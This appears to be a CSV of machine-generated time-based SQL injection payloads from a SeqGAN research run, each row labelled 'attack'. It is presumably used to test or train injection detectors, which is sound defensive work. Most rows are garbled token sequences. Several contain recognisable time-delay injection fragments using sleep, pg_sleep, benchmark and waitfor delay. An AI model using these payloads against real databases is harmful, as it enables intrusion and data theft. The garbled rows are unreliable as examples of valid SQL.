label,payload,family,payload_type,method,run_id,sample_index
attack,"1%I, if delay  (  )  sleep  (  ,",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,160
attack,1or  )   and where sleep  (  10000000  5000000  =  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,161
attack,1'  )  =  select   (  delay  (  ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,162
attack,"""))    or sleep  7260  _TIME____  ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,163
attack,"1 "" or sleep  (  __TIME__  )    =  ""  #l  (  select  ellll  (  substring",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,164
attack,";waitfor '0:0:__TIME__'""  =  "" if from  )l  =  =  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,165
attack,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  "" where  ; delay wherev  (  D  1  )",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,166
attack,",@ if sleep  (  5  _TIMEETIM",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,167
attack,"waitfor , not  (  )  2657lu  (  (  select ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,168
attack,sv  or pg_sleep  10000000  =  =  select  =  benchmark  5000000,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,169
attack,1 brr cilnlcvanl  ai),time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,170
attack,1'||  (  select 'lbet  and --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,171
attack,"1 or e(  (  50000005000000),7260  =",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,172
attack,1'  )  6456  =  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,173
attack,)    )  )    )  or benchmark  =  =  =  10000000,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,174
attack,"' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'as waitfor  yllrlwaitforbor sleep  (  ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,175
attack,"1   or pg_sleep  (  case  (  5000000,mbbE  5",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,176
attack, or sleep  =  benchmark  (  benchmark  =  _TIME,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,177
attack,""" or from  (  =  10000000MDsubstring  7260  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,178
attack," r  =  (  benchmark  (  =  10000000,MD  (  ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,179
attack,"1"";waitfor not  (  7739   1q where sleep  (  ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,180
attack,1 5702        (    benchmark  (  5  6784     --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,181
attack, or pg_sleep  5000000=  (  )  _  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,182
attack,$  )   or   (  # sleep  (  )   )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,183
attack,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""a  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,184
attack,"1%""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""oor  (    5000000___TIMED__",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,185
attack," ""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,186
attack,"""   ""  =  ""--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,187
attack,waitfor * not  (  (  select where 6784 from not  ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,188
attack,waitfor delay like if  T--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,189
attack, h(  5  select 4240 el%mtlelt  ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,190
attack,"""  ) or' waitfor delay '  (  substring  )  =  (  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,191
attack,"1', not)    (  select benchmark  (  select)     (",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,192
attack,"1'||  (  select ' if where pg_sleep  (  (  benchmark  5000000,1   (",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,193
attack," ab delay  =  (  #  10000000,ME__TI",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,194
attack,", not  (  =  5000000,(  pg_sleep  _T  (  benchmark",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,195
attack,;waitfor not  )   )    )    )   and 8514  _  ),time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,196
attack,waitfor *l  (_Tuwhen   and 6456  (    )  ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,197
attack, or  sleep  (  5000000 where  =  7260    10000000MD,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,198
attack,1 and pg_sleep  =  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,199
attack,"   )    )    )    aswaitforvbweo' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'""  )  ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,200
attack,waitforselect 7260  =  (    #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,201
attack,1   )    )    aa--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,202
attack,")    )    or benchmark  =  substring  10000000,_  or pg_sleep  ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,203
attack,   )s      m  =     and 4240  (  MD r,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,204
attack,1   )    )    5466 pg_sleep  (  5873_  8514  M_T,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,205
attack," sleep  5  (  --  10000000,mbm   'enpn' 7739 where",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,206
attack,9443  =  5000000M(  (  sleep       )  sleep  =  ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,207
attack,      (  (  )  T_   )  sleep  =  5  ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,208
attack,1 8594  =  __    =  #___TIME,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,209
attack,"1""  )      )    )      and '0:0:10'uwaitfor rnselect",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,210
attack, pg_sleep  =  5000000--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,211
attack,"1%',4287  or benchmark  =  5466  6272  (    ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,212
attack,"1"" and sleep  =  benchmark  )  ___)  _T",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,213
attack,""" or benchmark  _TIME__TM    _  0x4c4d6142",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,214
attack,;  where 1     =  )    (  ___    7739,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,215
attack,waitfor,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,216
attack,"1%for)  select,2657  select",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,217
attack,"""  ""  ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,218
attack,if where  5702   (  select 6784 not  =  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,219
attack,"""  9443  )     (  5  )  )   6272  =  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,220
attack,s pg_sleep  (  =  6784  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,221
attack,1%%t,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,222
attack,1'||  (  select '' where where5702 5702  (  select sleep  __  ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,223
attack,"$      (  )  )  )  or  ,M(  _  m",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,224
attack,")"")    and not  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,225
attack,1 5702 d@ual   (  )    (    (  case,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,226
attack,1'     )   and  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,227
attack,"1'   )    or sleep  (  10000000,,Mwhere,not=  ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,228
attack," where1361  )   or sleep  (  5000000,sleep  ____",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,229
attack,pg_sleep  * not  (  (  _  )--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,230
attack,benchmark  1     (  5702  (  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,231
attack,)    )   and '0:0:__TIME__'--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,232
attack,"1'   )    )    rlike sleep  (  5  )   and    (    (   'jif or pg_sleep  5000000,  m  =  benchmark  (  ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,233
attack,"1'   )    )    rlike sleep  (  5  )   and    (    (   ''  )   and sleep  (  select  #,@@v",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,234
attack,"1%'||  (  select '""  7739)   10       (  and--  benchmark  5000000",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,235
attack,6272    =  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,236
attack,"""  )   rlike sleep  (  5  )   and   (  ""   )    (  Z    _TIasbkEsv like",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,237
attack, and benchmark  _TIME___TIME__T,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,238
attack,1'||  (  select 'k: 8514 where whereubenchmark  )   (  5466  _,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,239
attack,"1'||  (  select ' 1%""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""bwaT",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,240
attack,"1%, if @     )    (lbpel",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,241
attack,    ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,242
attack,--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,243
attack,waitforor from   (  _  5000000  substring  10000000M_TIMc,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,244
attack,3885  =  =  )  benchmark  1--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,245
attack,""" or sleep  (  __TIME__  )    =  "" pg_sleep  (  5000000_substring  ,M(  7739  (  =  ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,246
attack,  (  T,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,247
attack,--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,248
attack,1%' ( or where where  (  =  )  10000000,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,249
attack,1%%  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,250
attack,j  =  )  )  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,251
attack, 4240  (  )   T    )         (  10000000  caseuv,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,252
attack,1'||  (  select 'vbaosvtnlel*(  =  substring   ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,253
attack,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""for pg_sleep  )  )  (  benchmark  (  3114  =",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,254
attack,)    ))    or pg_sleep  (  =  =  5000000abMD,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,255
attack,1'||  (  select '       5000000 where where 8781  =  (  _TIM,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,256
attack,8036  (  )  4240  6272  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,257
attack,1    (  1u)   or pg_sleep  (  5  5873  10000000,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,258
attack,"  6784, n  select z  T_  _TIME  ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,259
attack,",waitfor where  6456  (  )  (  10000000  =  benchmark  ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,260
attack,";1    ,waitfor not  (  10000000waitfor and@vnot  7260  ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,261
attack,""" or sleep  (  __TIME__  )    =  ""   )    )or sleep  (  )  ,--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,262
attack,1%wwcrt  (  5  benchmark  5  10000000  M_,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,263
attack,if or benchmark  (  10000000_TIME_TIME_,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,264
attack,1 if  )   )    )    )    )or 5466  (  =,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,265
attack,"1g%""  )   or sleep  _  _  5873  or  _",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,266
attack,"""   )    or sleep  (  (    #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,267
attack,1     6272  10000000  --     sleep  =  sleep  6272  (  ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,268
attack,"  ; if,if not   l  =  1    )   )   )",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,269
attack,""" or pg_sleep  ,--     5000000MDqsleep  (  (  ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,270
attack,"waitforwaitfor '0:0:__TIME__'select pg_sleep  (  __T  =  )  10000000,",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,271
attack,1'||  (  select 'wat,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,272
attack,""")    )    or benchmark  10000000,M__  )  benchmark  =",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,273
attack,; or1'||  (  select '--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,274
attack,   )        )    )    or sleep  (  100000005  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,275
attack, )orl  (  5873  )  select  10000000  1'     (,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,276
attack,$or10000000M  (  5  _  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,277
attack,"1%i""  =  ""or),or ( sleep  =  10000000,ME_",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,278
attack,; where |  (  _)    )   or benchmark  (  5,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,279
attack,;waitfore or benchmark  =  6456,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,280
attack,"1"" sleep  (  =  benchmark  (  #   8781  )  r",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,281
attack,)    )    ors  (  benchmark  select  # not  (  E,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,282
attack,"waitfor g not  (  6456_  benchmark  (  10000000,M  (",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,283
attack,", if from  --and not  )  )  )  5  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,284
attack,  )   7739or pg_sleep  =  (  (  # E_    ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,285
attack,waitfor delay not  =  5  (    ()  3114  =  ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,286
attack,"1% or pg_sleep  (  (  10000000  (  --,_m_",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,287
attack,""" or sleep  (  select pg_sleep  (  _  5000000__  ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,288
attack,waitfor delay  7629 '0:0:__TIME__'--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,289
attack,"     1361  ,  waitfor not  =  10000000,mdpg_sleep  (  ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,290
attack,1'  (  )  1'  =  )s if(  ve,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,291
attack, 7260  (  (  )  (  )     )  3885  ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,292
attack,"1' delay benchmark  =  5  )  sleep  6784  10000000,M",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,293
attack,"' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'   )or sleep  =  __TIME_  5000000_T",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,294
attack,"waitfor where  7260  (  )      _  (  10000000,benchmark  ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,295
attack,select 7739  (  __  )     )  sleep  substring  _  ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,296
attack,"--  ) and if  (  select  sleep  --  5000000,sleep  ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,297
attack,"1%""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,298
attack,""" where  sleep  (  )    (  #  )  5000000 ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,299
attack,"""  ;1 or benchmark  (  10000000,mm,waitfor  where ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,300
attack,)   or sleep  =  =  _  )  5  (  (  ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,301
attack,1' sleep  =  sleep  5  (  (  _)  _  ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,302
attack,") sleep  (  )  =  benchmark  10000000,ME_TIM",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,303
attack,";waitfor where pg_sleep  (  0x4c4d6142   select s  select""  )  ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,304
attack,1' where where where or pg_sleep  selectwaitfor  (  (  ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,305
attack,)    )    air 1361  =  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,306
attack,3824    or 4287  (  5  D  pg_sleep  (  )   )  ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,307
attack,", if from  =  =  6784  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,308
attack, not  (  )  sleep  =  5  (  )  =  benchmark,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,309
attack,""" or sleep  (  __TIME__  )    =  ""   )    )    or sleep  (  =  )  sleep  benchmark  ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,310
attack,"ifj*  7629 from from1 dif  (  6272,delay ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,311
attack,"       =  6272  select  =  benchmark  10000000,mmvnld",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,312
attack,"""  )   or sleep  (  __TIME__  )    =  ""   I  3885  --   (   k   selectselectuselect where ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,313
attack,;   sleep  --)  (  D  __  5000000)  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,314
attack,"M'  =  'or sleep    10000000,mn  =",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,315
attack,"1%'  or sleep  (  (  10000000  ),M_  (",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,316
attack,or sleep  (  sleep  =  I  (  _  )  (  ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,317
attack,)    and'enpn' benchmark  (  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,318
attack,"   (  )     5702,sleep  (  benchmark  select--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,319
attack,; where =    (  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,320
attack,; '0:0:__TIME__'--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,321
attack,",  or"" or sleep  (  __TIME__  )    =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,322
